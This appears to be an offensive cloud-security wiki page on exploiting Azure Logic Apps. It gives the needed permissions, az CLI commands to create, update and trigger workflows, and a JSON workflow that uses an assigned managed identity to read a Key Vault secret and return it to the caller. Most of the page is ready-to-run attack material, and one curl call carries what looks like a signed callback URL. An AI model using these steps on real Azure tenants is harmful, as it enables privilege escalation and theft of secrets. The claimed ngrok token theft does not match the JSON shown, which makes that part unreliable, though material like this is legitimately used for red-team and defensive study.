---
title: "Azure Logic Apps Explotation"
order: 172
description: Explotation of Logic Apps
---

## Create/Update workflows

> The following permissions are required:
> - **Microsoft.Resources/subscriptions/resourcegroups/read**
> - **Microsoft.Logic/workflows/read**
> - **Microsoft.Logic/workflows/write**
> - **Microsoft.ManagedIdentity/userAssignedIdentities/assign/action**
> - **Microsoft.Logic/workflows/triggers/run/action**
>
> These permissions allows to create/update Azure Logic Apps workflows with specific user managed identities and use them to get access tokens from them:

```bash
az logic workflow create \
  --resource-group $RESOURCE_GROUP \
  --name <workflow_name> \
  --definition <workflow_definition_file.json> \
  --location <location>
```

```bash
az logic workflow update \
  --name my-new-workflow \
  --resource-group $RESOURCE_GROUP \
  --definition <workflow_definition_file.json>
```

Example definition of workflow with manual trigger to steal a management token of an assigned identity listeningn in a ngrok URL:

```json
{
  "definition": {
    "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowDefinition.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {},
    "triggers": {
      "manual": {
        "type": "Request",
        "kind": "Http",
        "inputs": { "schema": {} }
      }
    },
    "actions": {
      "ReadSecret": {
        "type": "Http",
        "inputs": {
          "method": "GET",
          "uri": "https://<vault-name>.vault.azure.net/secrets/<secret-name>?api-version=7.4",
          "authentication": {
            "type": "ManagedServiceIdentity",
            "audience": "https://vault.azure.net",
            "identity": "/subscriptions/<sub-id>/resourceGroups/<RG>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<uami-name>"
          }
        }
      },
      "Respond": {
        "type": "Response",
        "runAfter": { "ReadSecret": ["Succeeded"] },
        "inputs": {
          "statusCode": 200,
          "body": "@body('ReadSecret')"
        }
      }
    },
    "outputs": {}
  },
  "parameters": {}
}
```

And after modifying it, you can run it with:

```bash
az rest \
  --method post \
  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourcegroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{logicAppName}/triggers/{triggerName}/run?api-version=2016-10-01" \
  --body '{}' \
  --headers "Content-Type=application/json"
```

OIf there is a manual trigger, you can get the callback URL and run it:

```bash
az rest --method POST \
  --url "https://management.azure.com/subscriptions/<subscription>/resourceGroups/<rg-name>>/providers/Microsoft.Logic/workflows/<workflow-name>>/triggers/manual/listCallbackUrl?api-version=2019-05-01" \
  --query "value" -o tsv
```

```bash
curl -X POST "https://prod-11.centralus.logic.azure.com:443/workflows/02f4e715c50a42c58b683629ddb889f5/triggers/manual/paths/invoke?api-version=2019-05-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=5m1THJOCzEl6WoZyaont4i2A62PpSZhK3BtVAzYYTPY"
```